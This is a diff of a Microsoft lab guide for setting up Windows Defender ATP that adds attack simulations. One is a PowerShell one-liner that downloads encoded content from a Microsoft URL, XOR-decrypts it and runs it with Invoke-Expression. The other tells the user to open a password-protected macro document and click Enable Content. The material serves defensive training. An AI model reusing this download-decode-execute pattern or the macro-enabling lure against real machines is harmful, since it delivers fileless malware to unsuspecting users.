@@ -279,7 +279,12 @@ In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 
 1. [] Press **(Y)** to confirm onboarding.
 1. [] Browse to +++\\\Contosodc\sysvol\Contoso.Azure\scripts+++ and copy the onboarding package there.
-1. [] Switch to @lab.VirtualMachine(VictimPC).SelectLink and log in with the credentials below.
+2. [] Return to the browser and click **Start using Windows Defender ATP** (ignore any warnings about onboarding).
+4. [] In the Windows Defender Security Center, click on **Settings > Advanced Features** and toggle the switches on for **Azure ATP integration** and **Microsoft Cloud App Security**.
+	
+	!IMAGE[g47p8c30.jpg](\Media\g47p8c30.jpg)
+
+3. [] Switch to @lab.VirtualMachine(VictimPC).SelectLink and log in with the credentials below.
 
 	+++JeffV+++
 
@@ -289,13 +294,16 @@ In this task, we will perform initial setup of WD ATP and onboard 2 machines.
 1. [] Copy **WindowsDefenderATPLocalOnboardingScript** to the desktop.
 1. [] Right-click on **WindowsDefenderATPLocalOnboardingScript** and click **Run as Administrator**.
 1. [] Press **(Y)** to confirm onboarding.
-1. [] Open a PowerShell window and click on the code below to type it in the window (please wait until you see **($decryptedBytes))** before pressing **Enter**):
+1. [] Run Attack Simulation #1 "Automated investigation (fileless attack)" by following the instructions below:
+	1. [] Open a PowerShell window and click on the code below to type it in the window (please wait until you see **($decryptedBytes))** before pressing **Enter**):
 	
 	+++[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;$xor = [System.Text.Encoding]::UTF8.GetBytes('WinATP-Intro-Injection');$base64String = (Invoke-WebRequest -URI https://winatpmanagement.windows.com/client/management/static/WinATP-Intro-Fileless.txt -UseBasicParsing).Content;Try{ $contentBytes = [System.Convert]::FromBase64String($base64String) } Catch { $contentBytes = [System.Convert]::FromBase64String($base64String.Substring(3)) };$i = 0; $decryptedBytes = @();$contentBytes.foreach{ $decryptedBytes += $_ -bxor $xor[$i]; $i++; if ($i -eq $xor.Length) {$i = 0} };Invoke-Expression ([System.Text.Encoding]::UTF8.GetString($decryptedBytes))+++
 
-1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and click **Start using Windows Defender ATP**.
-1. [] In the Windows Defender Security Center, click on **Settings > Advanced Features** and toggle the switches on for **Azure ATP integration** and **Microsoft Cloud App Security**.
-	!IMAGE[g47p8c30.jpg](\Media\g47p8c30.jpg)
+1. [] Switch to @lab.VirtualMachine(AdminPC).SelectLink and run Attack Simulation #2 "Automated investigation (backdoor)" by following the instructions below:
+	1. [] On the desktop, double-click on RS4_WinATP-Intro-Invoice.docm and enter +++WDATP!diy#+++ when prompted for a password.
+	2. [] Once the file opens, in the **Security Warning** ribbon, click **Enable Content**.
+	3. [] Click **OK** to confirm the attack.
+	4. [] Press **Enter** to close the command prompt window.
 ===
 # Workplace Join Clients
 
